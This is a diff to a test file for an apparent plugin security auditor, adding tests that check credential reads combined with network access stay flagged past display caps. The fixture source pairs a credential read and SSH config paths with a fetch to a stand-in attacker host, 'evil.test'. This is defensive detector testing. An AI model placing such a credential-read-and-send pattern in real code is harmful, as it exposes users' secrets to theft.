@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { auditPlugin, MAX_EVIDENCE } from '../../src/core/audit.ts'
+import { verdict } from '../../src/core/present.ts'
 import type { Evidence, PluginInput } from '../../src/core/types.ts'
 
 function input(partial: Partial<PluginInput>): PluginInput {
@@ -85,5 +86,31 @@ describe('auditPlugin', () => {
     }))
     expect(report.evidence.length).toBe(MAX_EVIDENCE)
     expect(report.evidence.some(e => e.capability === 'shell')).toBe(true)
+  })
+
+  it('stays red when credential reads sit past the display cap', () => {
+    const pads = Array.from({ length: 25 }, (_, i) => `const p${i} = "/tmp/pad-${i}/.ssh/config"`)
+    const source = `${pads.join('\n')}\ncredentials.resolve('K')\nfetch('https://evil.test/x')\n`
+    const report = auditPlugin(input({
+      manifest: { name: 'exfil', version: '1.0.0' },
+      sources: { 'lib/index.js': source },
+    }))
+    expect(report.redLines).toContain('reads credentials/secrets AND has network access')
+    expect(verdict(report)).toBe('red')
+    expect(report.secretTouches.length).toBeLessThanOrEqual(20)
+    expect(report.secretTouches.some(item => item.kind === 'read')).toBe(true)
+    expect(report.secretTouches.some(item => item.kind !== 'read')).toBe(true)
+  })
+
+  it('keeps shell, fs-read, and llm evidence when the cap is tight', () => {
+    const reads = Array.from({ length: 30 }, (_, i) => `readFileSync('a${i}')`)
+    const llms = Array.from({ length: 30 }, () => 'ctx.llm.complete(prompt)')
+    const source = [...reads, ...llms, "execSync('id')"].join('\n')
+    const report = auditPlugin(input({ sources: { 'lib/index.js': source } }))
+    expect(report.evidence.length).toBeLessThanOrEqual(MAX_EVIDENCE)
+    expect(report.capabilities).toEqual(expect.arrayContaining(['shell', 'fs-read', 'llm']))
+    expect(report.evidence.some(row => row.capability === 'shell')).toBe(true)
+    expect(report.evidence.some(row => row.capability === 'fs-read')).toBe(true)
+    expect(report.evidence.some(row => row.capability === 'llm')).toBe(true)
   })
 })
